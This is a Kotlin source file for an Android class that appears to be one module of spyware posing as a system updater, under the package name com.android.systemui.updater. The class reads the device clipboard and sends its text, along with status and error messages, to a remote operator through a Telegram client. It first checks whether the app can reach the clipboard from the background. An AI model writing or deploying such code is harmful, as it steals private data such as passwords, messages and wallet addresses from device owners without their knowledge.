package com.android.systemui.updater.capabilities

import android.Manifest
import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient

class ClipboardCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun read() {
        // On Android 10+, background apps cannot read clipboard unless they have special permission or are foreground
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            val appInForeground = isAppInForeground()
            val hasPermission = ContextCompat.checkSelfPermission(
                ctx, 
                "android.permission.READ_CLIPBOARD_IN_BACKGROUND"
            ) == PackageManager.PERMISSION_GRANTED
            
            if (!appInForeground && !hasPermission) {
                telegram.sendText("❌ Cannot read clipboard: app in background on Android 10+")
                return
            }
        }
        try {
            val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (!clipboard.hasPrimaryClip()) {
                telegram.sendText("📎 Clipboard is empty")
                return
            }
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: "No text content"
                telegram.sendText("📎 Clipboard:\n$text")
            } else {
                telegram.sendText("📎 Clipboard is empty")
            }
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot read clipboard: ${e.message}")
        }
    }

    private fun isAppInForeground(): Boolean {
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val processes = am.runningAppProcesses ?: return false
        val packageName = ctx.packageName
        return processes.any { 
            it.processName == packageName && it.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND 
        }
    }
}
